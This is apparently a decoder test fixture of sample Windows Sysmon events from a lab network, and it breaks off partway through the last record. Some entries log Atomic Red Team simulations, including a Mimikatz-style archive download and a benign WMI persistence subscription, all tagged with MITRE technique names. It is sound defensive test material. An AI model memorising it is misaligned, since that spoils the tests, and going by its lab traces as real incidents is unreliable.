{"source": "sysmon.ini:44", "name": "Sysmon EventID 5", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\OneDrive\\\\\\\\OneDrive.exe\",\"processGuid\":\"{4dc16835-dd35-6116-07a7-0c0000000000}\",\"processId\":\"5764\",\"utcTime\":\"2021-08-13 22:27:05.281\"},\"system\":{\"eventID\":\"5\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Process terminated:\\r\\nRuleName: -\\r\\nUtcTime: 2021-08-13 22:27:05.281\\r\\nProcessGuid: {4dc16835-dd35-6116-07a7-0c0000000000}\\r\\nProcessId: 5764\\r\\nImage: C:\\\\Users\\\\AtomicRed\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDrive.exe\\\"\",\"version\":\"3\",\"systemTime\":\"2021-08-13T22:27:05.2840390Z\",\"eventRecordID\":\"346832\",\"threadID\":\"4260\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"5\",\"processID\":\"2668\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:50", "name": "Sysmon EventID 6", "log": "{\"win\":{\"eventdata\":{\"signatureStatus\":\"Valid\",\"signature\":\"Oracle Corporation\",\"utcTime\":\"2021-08-14 00:58:34.609\",\"hashes\":\"SHA1=A33768C126545B2A5A1DB905D9F5E8ECC44074E1,MD5=52CA9687FFD4F6C5AA9C92A98BA3B319,SHA256=98535D8A486B339759CC73CF2E002E54EC887B0533ADD7064063B32A81C46F34,IMPHASH=DA88E590C5D4C95F6149672355A98A6B\",\"imageLoaded\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\drivers\\\\\\\\VBoxWddm.sys\",\"signed\":\"true\"},\"system\":{\"eventID\":\"6\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Driver loaded:\\r\\nRuleName: -\\r\\nUtcTime: 2021-08-14 00:58:34.609\\r\\nImageLoaded: C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxWddm.sys\\r\\nHashes: SHA1=A33768C126545B2A5A1DB905D9F5E8ECC44074E1,MD5=52CA9687FFD4F6C5AA9C92A98BA3B319,SHA256=98535D8A486B339759CC73CF2E002E54EC887B0533ADD7064063B32A81C46F34,IMPHASH=DA88E590C5D4C95F6149672355A98A6B\\r\\nSigned: true\\r\\nSignature: Oracle Corporation\\r\\nSignatureStatus: Valid\\\"\",\"version\":\"4\",\"systemTime\":\"2021-08-13T20:59:08.2957992Z\",\"eventRecordID\":\"342329\",\"threadID\":\"4272\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"6\",\"processID\":\"2668\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:56", "name": "Sysmon EventID 7", "log": "{\"win\":{\"eventdata\":{\"originalFileName\":\"wmiutils.dll\",\"image\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\WmiApSrv.exe\",\"product\":\"Microsoft® Windows® Operating System\",\"signature\":\"Microsoft Windows\",\"imageLoaded\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\wmiutils.dll\",\"description\":\"WMI\",\"signed\":\"true\",\"signatureStatus\":\"Valid\",\"processGuid\":\"{4dc16835-eaa5-612f-2d82-830000000000}\",\"processId\":\"3952\",\"utcTime\":\"2021-09-01 21:03:33.996\",\"hashes\":\"SHA1=C509BA56FBC9CED227B85C2120CC3168EC06266B,MD5=02AE3EA0E5F0C12724802768D3970E8A,SHA256=1287470AB7A43A3A01FCFCE8EF5A4EF62ADACE1388E6E2172E0D9698C364C9B3,IMPHASH=0D31E6D27B954AD879CB4DF742982F1A\",\"ruleName\":\"technique_id=T1047,technique_name=Windows Management Instrumentation\",\"company\":\"Microsoft Corporation\",\"fileVersion\":\"10.0.19041.1081 (WinBuild.160101.0800)\"},\"system\":{\"eventID\":\"7\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Image loaded:\\r\\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\\r\\nUtcTime: 2021-09-01 21:03:33.996\\r\\nProcessGuid: {4dc16835-eaa5-612f-2d82-830000000000}\\r\\nProcessId: 3952\\r\\nImage: C:\\\\Windows\\\\System32\\\\wbem\\\\WmiApSrv.exe\\r\\nImageLoaded: C:\\\\Windows\\\\System32\\\\wbem\\\\wmiutils.dll\\r\\nFileVersion: 10.0.19041.1081 (WinBuild.160101.0800)\\r\\nDescription: WMI\\r\\nProduct: Microsoft® Windows® Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: wmiutils.dll\\r\\nHashes: SHA1=C509BA56FBC9CED227B85C2120CC3168EC06266B,MD5=02AE3EA0E5F0C12724802768D3970E8A,SHA256=1287470AB7A43A3A01FCFCE8EF5A4EF62ADACE1388E6E2172E0D9698C364C9B3,IMPHASH=0D31E6D27B954AD879CB4DF742982F1A\\r\\nSigned: true\\r\\nSignature: Microsoft Windows\\r\\nSignatureStatus: Valid\\\"\",\"version\":\"3\",\"systemTime\":\"2021-09-01T21:03:33.9977500Z\",\"eventRecordID\":\"351623\",\"threadID\":\"3644\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"7\",\"processID\":\"2516\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:62", "name": "Sysmon EventID 8", "log": "{\"win\":{\"eventdata\":{\"targetProcessGuid\":\"{4dc16835-25ac-6114-0900-000000006000}\",\"targetProcessId\":\"552\",\"startAddress\":\"0xFFFFD91F60CF20D0\",\"utcTime\":\"2021-08-11 18:03:53.072\",\"ruleName\":\"technique_id=T1055,technique_name=Process Injection\",\"sourceProcessId\":\"948\",\"sourceImage\":\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\dwm.exe\",\"newThreadId\":\"6576\",\"sourceProcessGuid\":\"{4dc16835-25ad-6114-1100-000000006000}\",\"targetImage\":\"&lt;unknown process&gt;\"},\"system\":{\"eventID\":\"8\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"CreateRemoteThread detected:\\r\\nRuleName: technique_id=T1055,technique_name=Process Injection\\r\\nUtcTime: 2021-08-11 18:03:53.072\\r\\nSourceProcessGuid: {4dc16835-25ad-6114-1100-000000006000}\\r\\nSourceProcessId: 948\\r\\nSourceImage: C:\\\\Windows\\\\system32\\\\dwm.exe\\r\\nTargetProcessGuid: {4dc16835-25ac-6114-0900-000000006000}\\r\\nTargetProcessId: 552\\r\\nTargetImage: <unknown process>\\r\\nNewThreadId: 6576\\r\\nStartAddress: 0xFFFFD91F60CF20D0\\r\\nStartModule: -\\r\\nStartFunction: -\\\"\",\"version\":\"2\",\"systemTime\":\"2021-08-11T18:03:53.1714235Z\",\"eventRecordID\":\"339976\",\"threadID\":\"3620\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"8\",\"processID\":\"2368\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:68", "name": "Sysmon EventID 10", "log": "{\"win\":{\"eventdata\":{\"sourceThreadId\":\"4436\",\"grantedAccess\":\"0x3a84\",\"targetProcessGUID\":\"{4dc16835-ded5-612f-d02d-770000000000}\",\"targetProcessId\":\"6788\",\"utcTime\":\"2021-09-01 20:13:11.375\",\"ruleName\":\"technique_id=T1036,technique_name=Masquerading\",\"sourceProcessId\":\"4844\",\"sourceImage\":\"C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe\",\"targetImage\":\"C:\\\\\\\\Windows\\\\\\\\SoftwareDistribution\\\\\\\\Download\\\\\\\\Install\\\\\\\\updateplatform.exe\",\"sourceProcessGUID\":\"{4dc16835-ded7-612f-ec71-770000000000}\",\"callTrace\":\"C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+9d0d4|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE.dll+249ee|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+6b38b|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+1a487|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+1beab|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+1bb01|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+1ccf2|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+e89f|C:\\\\\\\\Windows\\\\\\\\TEMP\\\\\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\\\\\MpSigStub.exe+8b95c|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNEL32.DLL+17034|C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+52651\"},\"system\":{\"eventID\":\"10\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Process accessed:\\r\\nRuleName: technique_id=T1036,technique_name=Masquerading\\r\\nUtcTime: 2021-09-01 20:13:11.375\\r\\nSourceProcessGUID: {4dc16835-ded7-612f-ec71-770000000000}\\r\\nSourceProcessId: 4844\\r\\nSourceThreadId: 4436\\r\\nSourceImage: C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe\\r\\nTargetProcessGUID: {4dc16835-ded5-612f-d02d-770000000000}\\r\\nTargetProcessId: 6788\\r\\nTargetImage: C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\updateplatform.exe\\r\\nGrantedAccess: 0x3A84\\r\\nCallTrace: C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9d0d4|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+249ee|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+6b38b|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+1a487|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+1beab|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+1bb01|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+1ccf2|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+e89f|C:\\\\Windows\\\\TEMP\\\\E7559ABC-5904-4E4C-94E4-D210ACC05431\\\\MpSigStub.exe+8b95c|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+17034|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+52651\\\"\",\"version\":\"3\",\"systemTime\":\"2021-09-01T20:13:11.3897320Z\",\"eventRecordID\":\"180086\",\"threadID\":\"3140\",\"computer\":\"cfo.ExchangeTest.com\",\"task\":\"10\",\"processID\":\"2400\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:74", "name": "Sysmon EventID 11", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"processGuid\":\"{4dc16835-130a-6130-1800-000000006300}\",\"processId\":\"424\",\"utcTime\":\"2021-09-01 21:03:43.372\",\"targetFilename\":\"C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\WMIPRVSE.EXE-1628051C.pf\",\"ruleName\":\"technique_id=T1047,technique_name=File System Permissions Weakness\",\"creationUtcTime\":\"2021-02-23 17:48:15.536\"},\"system\":{\"eventID\":\"11\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"File created:\\r\\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\\r\\nUtcTime: 2021-09-01 21:03:43.372\\r\\nProcessGuid: {4dc16835-130a-6130-1800-000000006300}\\r\\nProcessId: 424\\r\\nImage: C:\\\\Windows\\\\System32\\\\svchost.exe\\r\\nTargetFilename: C:\\\\Windows\\\\Prefetch\\\\WMIPRVSE.EXE-1628051C.pf\\r\\nCreationUtcTime: 2021-02-23 17:48:15.536\\\"\",\"version\":\"2\",\"systemTime\":\"2021-09-01T21:03:43.3733588Z\",\"eventRecordID\":\"351624\",\"threadID\":\"3644\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"11\",\"processID\":\"2516\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:80", "name": "Sysmon EventID 12", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\wbem\\\\\\\\wmiprvse.exe\",\"targetObject\":\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\Windows Workflow Foundation 4.0.0.0\\\\\\\\Linkage\",\"processGuid\":\"{4dc16835-dab9-612f-5c76-040000000000}\",\"processId\":\"3124\",\"utcTime\":\"2021-09-01 21:03:33.507\",\"ruleName\":\"technique_id=T1543,technique_name=Service Creation\",\"eventType\":\"CreateKey\"},\"system\":{\"eventID\":\"12\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Registry object added or deleted:\\r\\nRuleName: technique_id=T1543,technique_name=Service Creation\\r\\nEventType: CreateKey\\r\\nUtcTime: 2021-09-01 21:03:33.507\\r\\nProcessGuid: {4dc16835-dab9-612f-5c76-040000000000}\\r\\nProcessId: 3124\\r\\nImage: C:\\\\Windows\\\\system32\\\\wbem\\\\wmiprvse.exe\\r\\nTargetObject: HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Windows Workflow Foundation 4.0.0.0\\\\Linkage\\\"\",\"version\":\"2\",\"systemTime\":\"2021-09-01T21:03:33.5134169Z\",\"eventRecordID\":\"351619\",\"threadID\":\"3644\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"12\",\"processID\":\"2516\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:87", "name": "Sysmon EventID 13", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"targetObject\":\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NcbService\\\\\\\\NCBKapiNlmCache\\\\\\\\9\\\\\\\\Value\",\"processGuid\":\"{4dc16835-130a-6130-1800-000000006300}\",\"processId\":\"424\",\"utcTime\":\"2021-09-01 20:58:03.282\",\"ruleName\":\"technique_id=T1543,technique_name=Service Creation\",\"details\":\"Binary Data\",\"eventType\":\"SetValue\"},\"system\":{\"eventID\":\"13\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Registry value set:\\r\\nRuleName: technique_id=T1543,technique_name=Service Creation\\r\\nEventType: SetValue\\r\\nUtcTime: 2021-09-01 20:58:03.282\\r\\nProcessGuid: {4dc16835-130a-6130-1800-000000006300}\\r\\nProcessId: 424\\r\\nImage: C:\\\\Windows\\\\System32\\\\svchost.exe\\r\\nTargetObject: HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\NcbService\\\\NCBKapiNlmCache\\\\9\\\\Value\\r\\nDetails: Binary Data\\\"\",\"version\":\"2\",\"systemTime\":\"2021-09-01T20:58:03.2841583Z\",\"eventRecordID\":\"351550\",\"threadID\":\"3644\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"13\",\"processID\":\"2516\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:93", "name": "Sysmon EventID 15", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\Explorer.EXE\",\"processGuid\":\"{4dc16835-dc72-612f-591d-0a0000000000}\",\"processId\":\"4480\",\"contents\":\"[ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\Downloads\\\\\\\\katz_trunk.zip\",\"utcTime\":\"2021-09-01 20:39:01.347\",\"targetFilename\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\Downloads\\\\\\\\katz_trunk\\\\\\\\x64\\\\\\\\spool.dll:Zone.Identifier\",\"ruleName\":\"technique_id=T1089,technique_name=Drive-by Compromise\",\"creationUtcTime\":\"2021-08-11 00:22:58.000\",\"hash\":\"SHA1=66B6C5EBA4BAEF803C9344763711DDEF70B5CCCD,MD5=9876DC6D155D58377D83FF94EC83FBA4,SHA256=07C83F0BF8F8A855CFD77B7E8F2014B8D808D14354B8CE540C2A9B0DF11AE367,IMPHASH=00000000000000000000000000000000\"},\"system\":{\"eventID\":\"15\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"File stream created:\\r\\nRuleName: technique_id=T1089,technique_name=Drive-by Compromise\\r\\nUtcTime: 2021-09-01 20:39:01.347\\r\\nProcessGuid: {4dc16835-dc72-612f-591d-0a0000000000}\\r\\nProcessId: 4480\\r\\nImage: C:\\\\Windows\\\\Explorer.EXE\\r\\nTargetFilename: C:\\\\Users\\\\AtomicRed\\\\Downloads\\\\katz_trunk\\\\x64\\\\spool.dll:Zone.Identifier\\r\\nCreationUtcTime: 2021-08-11 00:22:58.000\\r\\nHash: SHA1=66B6C5EBA4BAEF803C9344763711DDEF70B5CCCD,MD5=9876DC6D155D58377D83FF94EC83FBA4,SHA256=07C83F0BF8F8A855CFD77B7E8F2014B8D808D14354B8CE540C2A9B0DF11AE367,IMPHASH=00000000000000000000000000000000\\r\\nContents: [ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\\\\Users\\\\AtomicRed\\\\Downloads\\\\katz_trunk.zip  \\\"\",\"version\":\"2\",\"systemTime\":\"2021-09-01T20:39:01.3623659Z\",\"eventRecordID\":\"182584\",\"threadID\":\"3140\",\"computer\":\"cfo.ExchangeTest.com\",\"task\":\"15\",\"processID\":\"2400\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:99", "name": "Sysmon EventID 16", "log": "{\"win\":{\"eventdata\":{\"configuration\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\Downloads\\\\\\\\sysmon\\\\\\\\Sysmonjune22\\\\\\\\sysmonconfig.xml\",\"utcTime\":\"2021-07-20 19:32:20.396\",\"configurationFileHash\":\"SHA256=EFCDCF4315ACFDDAD6060A246CBE0115D8F49591B0535A2990F2101A67B7155C\"},\"system\":{\"eventID\":\"16\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Sysmon config state changed:\\r\\nUtcTime: 2021-07-20 19:32:20.396\\r\\nConfiguration: C:\\\\Users\\\\AtomicRed\\\\Downloads\\\\sysmon\\\\Sysmonjune22\\\\sysmonconfig.xml\\r\\nConfigurationFileHash: SHA256=EFCDCF4315ACFDDAD6060A246CBE0115D8F49591B0535A2990F2101A67B7155C\\\"\",\"version\":\"3\",\"systemTime\":\"2021-07-20T19:32:20.4013153Z\",\"eventRecordID\":\"279041\",\"threadID\":\"5780\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"16\",\"processID\":\"3688\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:105", "name": "Sysmon EventID 17", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\sihost.exe\",\"processGuid\":\"{4dc16835-dc71-612f-8335-090000000000}\",\"processId\":\"1596\",\"utcTime\":\"2021-09-01 20:23:42.451\",\"eventType\":\"CreatePipe\",\"pipeName\":\"\\\\\\\\AppContracts_x0A30B754-BF6E-423F-99E4-96AF8B5BD189y\"},\"system\":{\"eventID\":\"17\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Pipe Created:\\r\\nRuleName: -\\r\\nEventType: CreatePipe\\r\\nUtcTime: 2021-09-01 20:23:42.451\\r\\nProcessGuid: {4dc16835-dc71-612f-8335-090000000000}\\r\\nProcessId: 1596\\r\\nPipeName: \\\\AppContracts_x0A30B754-BF6E-423F-99E4-96AF8B5BD189y\\r\\nImage: C:\\\\Windows\\\\system32\\\\sihost.exe\\\"\",\"version\":\"1\",\"systemTime\":\"2021-09-01T20:23:42.4560267Z\",\"eventRecordID\":\"181769\",\"threadID\":\"3140\",\"computer\":\"cfo.ExchangeTest.com\",\"task\":\"17\",\"processID\":\"2400\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:111", "name": "Sysmon EventID 19", "log": "{\"win\":{\"eventdata\":{\"utcTime\":\"2021-03-01 20:53:46.257\",\"query\":\" \\\\\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\\\\\\\"\",\"name\":\" \\\\\\\"AtomicRedTeam-WMIPersistence-Example\\\\\\\"\",\"ruleName\":\"technique_id=T1047,technique_name=Windows Management Instrumentation\",\"eventType\":\"WmiFilterEvent\",\"eventNamespace\":\" \\\\\\\"root\\\\\\\\\\\\\\\\CimV2\\\\\\\"\",\"operation\":\"Created\",\"user\":\"DESKTOP-2QKFOBA\\\\\\\\AtomicRedTeamTest\"},\"system\":{\"eventID\":\"19\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"WmiEventFilter activity detected:\\r\\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\\r\\nEventType: WmiFilterEvent\\r\\nUtcTime: 2021-03-01 20:53:46.257\\r\\nOperation: Created\\r\\nUser: DESKTOP-2QKFOBA\\\\AtomicRedTeamTest\\r\\nEventNamespace:  \\\"root\\\\\\\\CimV2\\\"\\r\\nName:  \\\"AtomicRedTeam-WMIPersistence-Example\\\"\\r\\nQuery:  \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"\\\"\",\"version\":\"3\",\"systemTime\":\"2021-03-01T20:53:46.2650847Z\",\"eventRecordID\":\"33057\",\"threadID\":\"6368\",\"computer\":\"DESKTOP-2QKFOBA\",\"task\":\"19\",\"processID\":\"2368\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:117", "name": "Sysmon EventID 20", "log": "{\"win\":{\"eventdata\":{\"utcTime\":\"2021-03-01 20:53:46.273\",\"name\":\" \\\\\\\"AtomicRedTeam-WMIPersistence-Example\\\\\\\"\",\"destination\":\" \\\\\\\"C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\notepad.exe\\\\\\\"\",\"ruleName\":\"technique_id=T1047,technique_name=Windows Management Instrumentation\",\"eventType\":\"WmiConsumerEvent\",\"type\":\"Other\",\"operation\":\"Created\",\"user\":\"DESKTOP-2QKFOBA\\\\\\\\AtomicRedTeamTest\"},\"system\":{\"eventID\":\"20\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"WmiEventConsumer activity detected:\\r\\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\\r\\nEventType: WmiConsumerEvent\\r\\nUtcTime: 2021-03-01 20:53:46.273\\r\\nOperation: Created\\r\\nUser: DESKTOP-2QKFOBA\\\\AtomicRedTeamTest\\r\\nName:  \\\"AtomicRedTeam-WMIPersistence-Example\\\"\\r\\nType: Command Line\\r\\nDestination:  \\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\\\"\\\"\",\"version\":\"3\",\"systemTime\":\"2021-03-01T20:53:46.2783291Z\",\"eventRecordID\":\"33059\",\"threadID\":\"6368\",\"computer\":\"DESKTOP-2QKFOBA\",\"task\":\"20\",\"processID\":\"2368\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:123", "name": "Sysmon EventID 21", "log": "{\"win\":{\"eventdata\":{\"filter\":\" \\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\ROOT\\\\\\\\\\\\\\\\subscription:__EventFilter.Name=\\\\\\\\\\\\\\\"AtomicRedTeam-WMIPersistence-Example\\\\\\\\\\\\\\\"\\\\\\\"\",\"utcTime\":\"2021-03-01 20:53:46.570\",\"ruleName\":\"technique_id=T1047,technique_name=Windows Management Instrumentation\",\"eventType\":\"WmiBindingEvent\",\"operation\":\"Created\",\"user\":\"DESKTOP-2QKFOBA\\\\\\\\AtomicRedTeamTest\",\"consumer\":\" \\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\ROOT\\\\\\\\\\\\\\\\subscription:CommandLineEventConsumer.Name=\\\\\\\\\\\\\\\"AtomicRedTeam-WMIPersistence-Example\\\\\\\\\\\\\\\"\\\\\\\"\"},\"system\":{\"eventID\":\"21\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"WmiEventConsumerToFilter activity detected:\\r\\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\\r\\nEventType: WmiBindingEvent\\r\\nUtcTime: 2021-03-01 20:53:46.570\\r\\nOperation: Created\\r\\nUser: DESKTOP-2QKFOBA\\\\AtomicRedTeamTest\\r\\nConsumer:  \\\"\\\\\\\\\\\\\\\\.\\\\\\\\ROOT\\\\\\\\subscription:CommandLineEventConsumer.Name=\\\\\\\"AtomicRedTeam-WMIPersistence-Example\\\\\\\"\\\"\\r\\nFilter:  